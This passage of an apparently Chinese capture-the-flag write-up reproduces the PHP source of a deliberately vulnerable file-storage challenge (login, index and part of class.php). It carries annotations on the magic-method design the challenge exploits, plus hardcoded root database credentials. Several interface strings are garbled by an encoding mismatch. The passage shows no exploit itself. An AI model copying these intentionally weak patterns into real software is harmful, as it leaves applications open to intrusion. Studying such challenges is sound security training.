'warning');&lt;/script&gt;"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;toast('璇疯緭鍏ユ湁鏁堢敤鎴峰悕鍜屽瘑鐮�', 'warning');&lt;/script&gt;"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span></span><br><span class="line"><span class="php">    header(<span class="string">"Location: index.php"</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>鐧诲綍<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- Bootstrap core CSS --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"static/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.bd-placeholder-img</span> &#123;</span></span><br><span class="line"><span class="css">      <span class="selector-tag">font-size</span>: 1<span class="selector-class">.125rem</span>;</span></span><br><span class="line">      text-anchor: middle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    @<span class="keyword">media</span> (min-width: <span class="number">768px</span>) &#123;</span></span><br><span class="line"><span class="css">      <span class="selector-class">.bd-placeholder-img-lg</span> &#123;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">font-size</span>: 3<span class="selector-class">.5rem</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Custom styles for this template --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"static/css/std.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-signin"</span> <span class="attr">action</span>=<span class="string">"login.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"h3 mb-3 font-weight-normal"</span>&gt;</span>鐧诲綍<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"username"</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"Username"</span> <span class="attr">required</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"password"</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"Password"</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-lg btn-primary btn-block"</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>鎻愪氦<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"mt-5 text-muted"</span>&gt;</span>杩樻病鏈夎处鍙�? <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"register.php"</span>&gt;</span>娉ㄥ唽<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"text-muted"</span>&gt;</span>&amp;copy; 2018-2019<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"top"</span> <span class="attr">id</span>=<span class="string">"toast-container"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/js/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/js/bootstrap.bundle.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/js/toast.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'register'</span>])) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;toast('娉ㄥ唽鎴愬姛', 'info');&lt;/script&gt;"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"username"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"password"</span>])) &#123;</span></span><br><span class="line"><span class="php">    $u = <span class="keyword">new</span> User();</span></span><br><span class="line"><span class="php">    $username = (string) $_POST[<span class="string">"username"</span>];</span></span><br><span class="line"><span class="php">    $password = (string) $_POST[<span class="string">"password"</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (strlen($username) &lt; <span class="number">20</span> &amp;&amp; $u-&gt;verify_user($username, $password)) &#123;</span></span><br><span class="line"><span class="php">        $_SESSION[<span class="string">'login'</span>] = <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">        $_SESSION[<span class="string">'username'</span>] = htmlentities($username);</span></span><br><span class="line"><span class="php">        $sandbox = <span class="string">"uploads/"</span> . sha1($_SESSION[<span class="string">'username'</span>] . <span class="string">"sftUahRiTz"</span>) . <span class="string">"/"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (!is_dir($sandbox)) &#123;</span></span><br><span class="line"><span class="php">            mkdir($sandbox);    		<span class="comment">#为用户创建沙箱</span></span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        $_SESSION[<span class="string">'sandbox'</span>] = $sandbox;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span>(<span class="string">"&lt;script&gt;window.location.href='index.php';&lt;/script&gt;"</span>); 	<span class="comment">#跳转到index.php</span></span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;toast('璐﹀彿鎴栧瘑鐮侀敊璇�', 'warning');&lt;/script&gt;"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span></span><br><span class="line"><span class="php">    header(<span class="string">"Location: login.php"</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>缃戠洏绠＄悊<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"static/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"static/css/panel.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/js/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/js/bootstrap.bundle.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/js/toast.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"static/js/panel.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">nav</span> <span class="attr">aria-label</span>=<span class="string">"breadcrumb"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ol</span> <span class="attr">class</span>=<span class="string">"breadcrumb"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item active"</span>&gt;</span>绠＄悊闈㈡澘<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item active"</span>&gt;</span><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"fileInput"</span> <span class="attr">class</span>=<span class="string">"fileLabel"</span>&gt;</span>涓婁紶鏂囦欢<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active ml-auto"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>浣犲ソ <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_SESSION[<span class="string">'username'</span>]<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"fileInput"</span> <span class="attr">class</span>=<span class="string">"hidden"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"top"</span> <span class="attr">id</span>=<span class="string">"toast-container"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> FileList($_SESSION[<span class="string">'sandbox'</span>]);		<span class="comment">#new了一个FileList对象，事件里添加一个沙箱</span></span></span><br><span class="line"><span class="php">$a-&gt;Name();</span></span><br><span class="line"><span class="php">$a-&gt;Size();</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>最重要的来了。</p>
<h2 id="class-php"><a href="#class-php" class="headerlink" title="class.php"></a>class.php</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">$dbaddr = <span class="string">"127.0.0.1"</span>;</span></span><br><span class="line"><span class="php">$dbuser = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="php">$dbpass = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="php">$dbname = <span class="string">"dropbox"</span>;</span></span><br><span class="line"><span class="php">$db = <span class="keyword">new</span> mysqli($dbaddr, $dbuser, $dbpass, $dbname);			<span class="comment">#创建数据库</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;			<span class="comment">#用户类，有一个db属性</span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $db;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;		<span class="comment">#构造方法，为db赋全局变量db的值</span></span></span><br><span class="line"><span class="php">        <span class="keyword">global</span> $db;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;db = $db;	</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span><span class="params">($username)</span> </span>&#123;			<span class="comment">#验证用户是否存在</span></span></span><br><span class="line"><span class="php">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);</span></span><br><span class="line"><span class="php">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span></span><br><span class="line"><span class="php">        $stmt-&gt;execute();</span></span><br><span class="line"><span class="php">        $stmt-&gt;store_result();</span></span><br><span class="line"><span class="php">        $count = $stmt-&gt;num_rows;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> ($count === <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span><span class="params">($username, $password)</span> </span>&#123;		<span class="comment">#添加用户</span></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span></span><br><span class="line"><span class="php">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);</span></span><br><span class="line"><span class="php">        $stmt-&gt;bind_param(<span class="string">"ss"</span>, $username, $password);</span></span><br><span class="line"><span class="php">        $stmt-&gt;execute();</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span><span class="params">($username, $password)</span> </span>&#123;		<span class="comment">#验证用户密码</span></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span></span><br><span class="line"><span class="php">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span>);</span></span><br><span class="line"><span class="php">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span></span><br><span class="line"><span class="php">        $stmt-&gt;execute();</span></span><br><span class="line"><span class="php">        $stmt-&gt;bind_result($expect);</span></span><br><span class="line"><span class="php">        $stmt-&gt;fetch();</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">isset</span>($expect) &amp;&amp; $expect === $password) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;			<span class="comment">#User的析构方法，启用db的close()方法</span></span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $files;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $results;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $funcs;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;		</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span></span><br><span class="line"><span class="php">        $filenames = scandir($path);	<span class="comment">#列出 $path 目录中的文件和目录并赋值给filenames数组,</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        $key = array_search(<span class="string">"."</span>, $filenames);		<span class="comment">#销毁带文件名带.or..的文件</span></span></span><br><span class="line"><span class="php">        <span class="keyword">unset</span>($filenames[$key]);</span></span><br><span class="line"><span class="php">        $key = array_search(<span class="string">".."</span>, $filenames);</span></span><br><span class="line"><span class="php">        <span class="keyword">unset</span>($filenames[$key]);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;		</span></span><br><span class="line"><span class="php">            $file = <span class="keyword">new</span> File();	</span></span><br><span class="line"><span class="php">            $file-&gt;open($path . $filename);		<span class="comment">#给file赋值filename</span></span></span><br><span class="line"><span class="php">            array_push(<span class="keyword">$this</span>-&gt;files, $file);	<span class="comment">#为files数组添加filename</span></span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();	<span class="comment">#result的键名为filename</span></span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;	<span class="comment">#调用类中不存在的方法时触发__call,给每个对象添加这个方法</span></span></span><br><span class="line"><span class="php">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span></span><br><span class="line"><span class="php">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();	</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;		<span 